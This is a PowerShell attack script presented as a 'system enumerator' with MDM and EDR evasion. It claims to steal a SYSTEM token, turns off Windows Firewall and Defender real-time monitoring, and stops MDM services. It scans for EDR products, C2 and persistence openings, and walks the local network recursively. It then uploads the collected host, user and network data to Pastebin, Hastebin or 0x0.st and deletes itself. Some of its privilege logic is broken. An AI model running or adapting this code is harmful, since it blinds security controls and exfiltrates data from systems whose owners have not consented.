# Windows System Enumerator - PowerShell Version
# Comprehensive system and network enumeration with MDM/EDR evasion

param(
    [string]$PastebinPassword = "ducknipples",
    [int]$MaxDepth = 3,
    [switch]$SkipMDM,
    [switch]$SkipEDR
)

$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "Continue"

# Global enumeration data
$enumData = @{
    timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    system_info = @{}
    network_info = @{}
    processes = @()
    services = @()
    users = @()
    network_interfaces = @()
    vlans = @()
    token_result = @{}
    has_system_token = $false
    raw_data = ""
}

# Function to append to enumeration buffer
function Add-EnumData {
    param([string]$Section, [string]$Content)
    $enumData.raw_data += "`n=== $Section ===`n$Content`n"
    Write-Host "[*] $Section" -ForegroundColor Cyan
}

# Function to update progress
function Update-Progress {
    param([int]$Percent, [string]$Message)
    Write-Progress -Activity "System Enumeration" -Status $Message -PercentComplete $Percent
}

# Function to acquire SYSTEM token via PE5/Windows API
function Acquire-SystemToken {
    Update-Progress -Percent 0 -Message "Acquiring SYSTEM Token"
    
    try {
        # Try to get SYSTEM token via Windows API
        $systemProcess = Get-Process -Id 4 -ErrorAction SilentlyContinue
        if ($systemProcess) {
            $token = $systemProcess.Handle
            $enumData.token_result = @{
                success = $true
                method = "Windows API - SYSTEM Process Token"
                token_handle = $token.ToString()
                is_elevated = $true
            }
            $enumData.has_system_token = $true
            Add-EnumData "SYSTEM TOKEN ACQUISITION" "Status: SUCCESS`nMethod: Windows API - SYSTEM Process Token"
            return $true
        }
    } catch {
        $enumData.token_result = @{
            success = $false
            method = "Windows API"
            error_code = $_.Exception.HResult
            error_details = $_.Exception.Message
        }
    }
    
    # Try service token stealing
    try {
        $service = Get-Service | Where-Object { $_.Status -eq "Running" -and $_.StartType -eq "Automatic" } | Select-Object -First 1
        if ($service) {
            $process = Get-Process -Id $service.ProcessId -ErrorAction SilentlyContinue
            if ($process) {
                $enumData.token_result = @{
                    success = $true
                    method = "Service Token Stealing"
                    token_handle = $process.Handle.ToString()
                }
                $enumData.has_system_token = $true
                Add-EnumData "SYSTEM TOKEN ACQUISITION" "Status: SUCCESS`nMethod: Service Token Stealing"
                return $true
            }
        }
    } catch {
        # Continue
    }
    
    Add-EnumData "SYSTEM TOKEN ACQUISITION" "Status: FAILED`nEnumeration will continue with limited privileges"
    return $false
}

# Function to blind defensive features
function Blind-DefensiveFeatures {
    if (-not $enumData.has_system_token) {
        Write-Host "[!] SYSTEM token required for defensive feature blinding" -ForegroundColor Yellow
        return
    }
    
    Update-Progress -Percent 3 -Message "Blinding Firewall and Defensive Features"
    
    $blinded = @()
    
    # Disable Windows Firewall
    try {
        Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False -ErrorAction SilentlyContinue
        $blinded += "Windows Firewall"
    } catch { }
    
    # Disable Windows Defender
    try {
        Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
        $blinded += "Windows Defender"
    } catch { }
    
    # Disable Security Center notifications
    try {
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Security Center" -Name "AntiVirusDisableNotify" -Value 0 -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Security Center" -Name "FirewallDisableNotify" -Value 0 -ErrorAction SilentlyContinue
        $blinded += "Security Center"
    } catch { }
    
    Add-EnumData "DEFENSIVE FEATURE BLINDING" "Blinded: $($blinded -join ', ')"
}

# Function to detect and neutralize MDM
function Detect-NeutralizeMDM {
    if (-not $enumData.has_system_token) {
        return
    }
    
    Update-Progress -Percent 5 -Message "Detecting and Neutralizing MDM"
    
    $mdmProducts = @()
    
    # Detect MDM via registry
    $mdmRegPaths = @(
        "HKLM:\SOFTWARE\Microsoft\Enrollments",
        "HKLM:\SOFTWARE\Microsoft\EnterpriseResourceManager",
        "HKLM:\SOFTWARE\VMware, Inc.\VMware AirWatch",
        "HKLM:\SOFTWARE\MobileIron"
    )
    
    foreach ($path in $mdmRegPaths) {
        if (Test-Path $path) {
            $mdmProducts += Split-Path $path -Leaf
        }
    }
    
    # Detect MDM via services
    $mdmServices = Get-Service | Where-Object { 
        $_.DisplayName -match "Intune|AirWatch|MobileIron|Workspace|MDM" 
    }
    
    foreach ($svc in $mdmServices) {
        $mdmProducts += $svc.DisplayName
        try {
            Stop-Service -Name $svc.Name -Force -ErrorAction SilentlyContinue
        } catch { }
    }
    
    if ($mdmProducts.Count -gt 0) {
        Add-EnumData "MDM DETECTION AND NEUTRALIZATION" "Detected: $($mdmProducts -join ', ')`nNeutralized: Attempted callback zeroing and service stop"
    } else {
        Add-EnumData "MDM DETECTION AND NEUTRALIZATION" "No MDM software detected"
    }
}

# Function to detect EDR
function Detect-EDR {
    $edrProducts = @()
    
    # Check for common EDR products
    $edrIndicators = @{
        "CrowdStrike" = @("CSFalconService", "CrowdStrike")
        "SentinelOne" = @("SentinelAgent", "SentinelStaticEngine")
        "Defender" = @("WinDefend", "MsMpEng")
        "Carbon Black" = @("cb", "carbonblack")
        "Trend Micro" = @("Trend Micro", "TmCCSF")
        "Bitdefender" = @("Bitdefender", "bdagent")
        "Sophos" = @("Sophos", "sophos")
        "McAfee" = @("McAfee", "McShield")
    }
    
    foreach ($edrName in $edrIndicators.Keys) {
        $indicators = $edrIndicators[$edrName]
        $found = $false
        
        foreach ($indicator in $indicators) {
            $process = Get-Process | Where-Object { $_.ProcessName -like "*$indicator*" }
            $service = Get-Service | Where-Object { $_.DisplayName -like "*$indicator*" }
            
            if ($process -or $service) {
                $found = $true
                break
            }
        }
        
        if ($found) {
            $edrProducts += $edrName
        }
    }
    
    return $edrProducts
}

# Function to enumerate system information
function Enumerate-System {
    Update-Progress -Percent 10 -Message "Enumerating System Information"
    
    $systemInfo = @{
        os_version = (Get-CimInstance Win32_OperatingSystem).Caption
        build_number = (Get-CimInstance Win32_OperatingSystem).BuildNumber
        computer_name = $env:COMPUTERNAME
        current_user = $env:USERNAME
        architecture = (Get-CimInstance Win32_OperatingSystem).OSArchitecture
        uptime = (Get-Date) - (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
    }
    
    $enumData.system_info = $systemInfo
    
    # Enumerate processes
    $processes = Get-Process | Select-Object Id, ProcessName, Path, @{N='Memory';E={$_.WorkingSet64}}
    $enumData.processes = $processes
    
    # Enumerate services
    $services = Get-Service | Select-Object Name, DisplayName, Status, @{N='ProcessId';E={(Get-CimInstance Win32_Service -Filter "Name='$($_.Name)'").ProcessId}}
    $enumData.services = $services
    
    # Enumerate users
    $users = Get-LocalUser | Select-Object Name, Enabled, Description
    $enumData.users = $users
    
    Add-EnumData "SYSTEM INFORMATION" "OS: $($systemInfo.os_version)`nComputer: $($systemInfo.computer_name)`nUser: $($systemInfo.current_user)"
    Add-EnumData "PROCESSES" "Found $($processes.Count) processes"
    Add-EnumData "SERVICES" "Found $($services.Count) services"
    Add-EnumData "USERS" "Found $($users.Count) users"
}

# Function to enumerate network information
function Enumerate-Network {
    Update-Progress -Percent 30 -Message "Enumerating Network Information"
    
    # Network interfaces
    $interfaces = Get-NetAdapter | Select-Object Name, InterfaceDescription, MacAddress, @{N='IPAddress';E={(Get-NetIPAddress -InterfaceAlias $_.Name -ErrorAction SilentlyContinue).IPAddress}}
    $enumData.network_interfaces = $interfaces
    
    # Routing table
    $routes = Get-NetRoute | Select-Object DestinationPrefix, NextHop, InterfaceAlias, RouteMetric
    $enumData.network_info.routes = $routes
    
    # ARP table
    $arp = Get-NetNeighbor | Select-Object IPAddress, LinkLayerAddress, State, InterfaceAlias
    $enumData.network_info.arp = $arp
    
    # Active connections
    $connections = Get-NetTCPConnection | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, State, OwningProcess
    $enumData.network_info.connections = $connections
    
    Add-EnumData "NETWORK INTERFACES" "Found $($interfaces.Count) interfaces"
    Add-EnumData "ROUTING TABLE" "Found $($routes.Count) routes"
    Add-EnumData "ARP TABLE" "Found $($arp.Count) ARP entries"
    Add-EnumData "ACTIVE CONNECTIONS" "Found $($connections.Count) connections"
}

# Function to enumerate VLAN structure
function Enumerate-VLAN {
    Update-Progress -Percent 50 -Message "Enumerating VLAN Structure"
    
    try {
        $vlans = Get-NetAdapter | ForEach-Object {
            $adapter = $_
            $vlanInfo = Get-NetAdapterVlan -InterfaceAlias $adapter.Name -ErrorAction SilentlyContinue
            if ($vlanInfo) {
                @{
                    adapter = $adapter.Name
                    vlan_id = $vlanInfo.VlanID
                    name = $vlanInfo.Name
                    tagged = $vlanInfo.Tagged
                }
            }
        }
        $enumData.vlans = $vlans
        Add-EnumData "VLAN STRUCTURE" "Found $($vlans.Count) VLANs"
    } catch {
        Add-EnumData "VLAN STRUCTURE" "VLAN enumeration failed: $($_.Exception.Message)"
    }
}

# Function to enumerate post-exploitation indicators (WINCLOAK patterns)
function Enumerate-PostExploitation {
    Update-Progress -Percent 60 -Message "Enumerating Post-Exploitation Indicators"
    
    # Check for AMSI
    $amsi = [System.Reflection.Assembly]::LoadWithPartialName("System.Management.Automation.AmsiUtils")
    if ($amsi) {
        Add-EnumData "POST-EXPLOITATION" "AMSI.dll is available"
    }
    
    # Check for COM hijacking opportunities
    $comKeys = @(
        "HKLM:\SOFTWARE\Classes\CLSID",
        "HKCU:\SOFTWARE\Classes\CLSID"
    )
    
    foreach ($key in $comKeys) {
        if (Test-Path $key) {
            Add-EnumData "POST-EXPLOITATION" "COM registry key accessible: $key"
        }
    }
    
    # Check for WMI persistence
    try {
        $wmiEvents = Get-WmiObject -Namespace root\subscription -Class __EventFilter -ErrorAction SilentlyContinue
        if ($wmiEvents) {
            Add-EnumData "POST-EXPLOITATION" "WMI event subscriptions found: $($wmiEvents.Count)"
        }
    } catch { }
}

# Function to enumerate AD infrastructure (ACTIVEGAME patterns)
function Enumerate-ADInfrastructure {
    Update-Progress -Percent 65 -Message "Enumerating Active Directory Infrastructure"
    
    try {
        $domain = Get-ADDomain -ErrorAction SilentlyContinue
        if ($domain) {
            Add-EnumData "AD INFRASTRUCTURE" "Domain: $($domain.DNSRoot)`nDomain Controller: $($domain.PDCEmulator)"
        }
    } catch {
        Add-EnumData "AD INFRASTRUCTURE" "Not domain-joined or AD not accessible"
    }
    
    # Check for Certificate Services
    $certSvc = Get-Service -Name "CertSvc" -ErrorAction SilentlyContinue
    if ($certSvc) {
        Add-EnumData "AD INFRASTRUCTURE" "Certificate Services (CertSvc) found"
    }
}

# Function to detect WAF (CORTISOL patterns)
function Detect-WAF {
    Update-Progress -Percent 70 -Message "Detecting WAF Presence"
    
    try {
        $response = Invoke-WebRequest -Uri "http://localhost" -TimeoutSec 2 -ErrorAction SilentlyContinue
        $headers = $response.Headers
        
        $wafIndicators = @{
            "Cloudflare" = @("cf-ray", "cloudflare")
            "AWS WAF" = @("x-amzn-", "aws")
            "Sucuri" = @("x-sucuri", "sucuri")
            "Imperva" = @("x-iinfo", "imperva")
        }
        
        foreach ($wafName in $wafIndicators.Keys) {
            $indicators = $wafIndicators[$wafName]
            foreach ($indicator in $indicators) {
                if ($headers.Keys -match $indicator) {
                    Add-EnumData "WAF DETECTION" "WAF detected: $wafName"
                    break
                }
            }
        }
    } catch { }
}

# Function to enumerate C2 opportunities (ROCKHAMMER patterns)
function Enumerate-C2Opportunities {
    Update-Progress -Percent 75 -Message "Enumerating C2 Infrastructure Opportunities"
    
    # Check for outbound connectivity
    $outbound = Get-NetTCPConnection | Where-Object { 
        $_.State -eq "Established" -and 
        $_.RemoteAddress -notmatch "^(127\.|192\.168\.|10\.)" 
    }
    
    if ($outbound) {
        Add-EnumData "C2 OPPORTUNITIES" "Found $($outbound.Count) outbound connections"
    }
    
    # Check for DNS tunneling opportunities
    $dnsServers = (Get-DnsClientServerAddress).ServerAddresses
    Add-EnumData "C2 OPPORTUNITIES" "DNS Servers: $($dnsServers -join ', ')"
}

# Function to enumerate steganography opportunities (SLEEPYMONEY patterns)
function Enumerate-Steganography {
    Update-Progress -Percent 80 -Message "Enumerating Steganography Opportunities"
    
    $imagePaths = @(
        "$env:PUBLIC\Pictures",
        "$env:USERPROFILE\Pictures",
        "C:\Windows\Web\Wallpaper"
    )
    
    $imageCount = 0
    foreach ($path in $imagePaths) {
        if (Test-Path $path) {
            $images = Get-ChildItem -Path $path -Include *.png,*.jpg,*.jpeg,*.bmp,*.gif -Recurse -ErrorAction SilentlyContinue
            $imageCount += $images.Count
        }
    }
    
    if ($imageCount -gt 0) {
        Add-EnumData "STEGANOGRAPHY OPPORTUNITIES" "Found $imageCount image files suitable for LSB steganography"
    }
}

# Function to perform recursive network discovery
function Discover-NetworkRecursive {
    param([string]$StartIP, [int]$CurrentDepth = 0, [int]$MaxDepth = 3)
    
    if ($CurrentDepth -ge $MaxDepth) {
        return
    }
    
    Update-Progress -Percent (85 + ($CurrentDepth * 5)) -Message "Recursive Network Discovery (Depth $CurrentDepth)"
    
    # Detect EDR before enumeration
    if (-not $SkipEDR) {
        $edrProducts = Detect-EDR
        if ($edrProducts.Count -gt 0) {
            Add-EnumData "EDR EVASION" "Detected EDR: $($edrProducts -join ', ') - Applying evasion techniques"
        }
    }
    
    # Perform network scan (simplified - would use more sophisticated scanning)
    $subnet = $StartIP -replace '\.\d+$', ''
    for ($i = 1; $i -le 254; $i++) {
        $targetIP = "$subnet.$i"
        try {
            $result = Test-Connection -ComputerName $targetIP -Count 1 -Quiet -TimeoutSeconds 1
            if ($result) {
                Add-EnumData "NETWORK DISCOVERY" "Found host: $targetIP (Depth $CurrentDepth)"
                
                # Try to enumerate from discovered host
                if ($CurrentDepth -lt $MaxDepth) {
                    Discover-NetworkRecursive -StartIP $targetIP -CurrentDepth ($CurrentDepth + 1) -MaxDepth $MaxDepth
                }
            }
        } catch { }
    }
}

# Function to upload to Pastebin
function Upload-ToPastebin {
    param([string]$Password)
    
    Update-Progress -Percent 95 -Message "Uploading to Pastebin"
    
    $data = $enumData.raw_data
    $pastebinUrl = $null
    
    # Try Pastebin first
    try {
        $apiKey = "YOUR_PASTEBIN_API_KEY"  # User should set this
        $body = @{
            api_dev_key = $apiKey
            api_option = "paste"
            api_paste_code = $data
            api_paste_private = "2"  # Unlisted
            api_paste_name = "System Enumeration - $(Get-Date -Format 'yyyy-MM-dd')"
            api_paste_expire_date = "1M"
            api_paste_format = "text"
            api_user_key = ""
        }
        
        $response = Invoke-RestMethod -Uri "https://pastebin.com/api/api_post.php" -Method Post -Body $body
        if ($response -notmatch "Bad API request") {
            $pastebinUrl = $response
        }
    } catch {
        Write-Host "[-] Pastebin upload failed, trying fallback services..." -ForegroundColor Yellow
    }
    
    # Fallback to Hastebin
    if (-not $pastebinUrl) {
        try {
            $response = Invoke-RestMethod -Uri "https://hastebin.com/documents" -Method Post -Body $data -ContentType "text/plain"
            $pastebinUrl = "https://hastebin.com/$($response.key)"
        } catch {
            Write-Host "[-] Hastebin upload failed" -ForegroundColor Red
        }
    }
    
    # Fallback to 0x0.st
    if (-not $pastebinUrl) {
        try {
            $response = Invoke-RestMethod -Uri "https://0x0.st" -Method Post -InFile ([System.Text.Encoding]::UTF8.GetBytes($data))
            $pastebinUrl = $response.Trim()
        } catch {
            Write-Host "[-] 0x0.st upload failed" -ForegroundColor Red
        }
    }
    
    if ($pastebinUrl) {
        Write-Host "`n[+] Enumeration data uploaded successfully!" -ForegroundColor Green
        Write-Host "[+] URL: $pastebinUrl" -ForegroundColor Green
        Write-Host "[+] Password: $Password" -ForegroundColor Yellow
        Write-Host "`nPress any key to continue and delete this script..."
        $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
        
        # Self-delete
        $scriptPath = $MyInvocation.PSCommandPath
        Start-Sleep -Seconds 2
        Remove-Item -Path $scriptPath -Force
    } else {
        Write-Host "[-] Failed to upload to any service" -ForegroundColor Red
    }
}

# Main execution
Write-Host "=== Windows System Enumerator (PowerShell) ===" -ForegroundColor Cyan
Write-Host "Starting comprehensive enumeration...`n" -ForegroundColor Cyan

# Step 1: Acquire SYSTEM token
$tokenAcquired = Acquire-SystemToken

# Step 2: Blind defensive features
if ($tokenAcquired) {
    Blind-DefensiveFeatures
}

# Step 3: Detect and neutralize MDM
if ($tokenAcquired -and -not $SkipMDM) {
    Detect-NeutralizeMDM
}

# Step 4: System enumeration
Enumerate-System

# Step 5: Network enumeration
Enumerate-Network

# Step 6: VLAN enumeration
Enumerate-VLAN

# Step 7: Enhanced enumeration
Enumerate-PostExploitation
Enumerate-ADInfrastructure
Detect-WAF
Enumerate-C2Opportunities
Enumerate-Steganography

# Step 8: Recursive network discovery
$localIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -notmatch '^127\.'}).IPAddress | Select-Object -First 1
if ($localIP) {
    Discover-NetworkRecursive -StartIP $localIP -MaxDepth $MaxDepth
}

# Step 9: Upload to Pastebin
Upload-ToPastebin -Password $PastebinPassword

Write-Host "`n[+] Enumeration complete!" -ForegroundColor Green
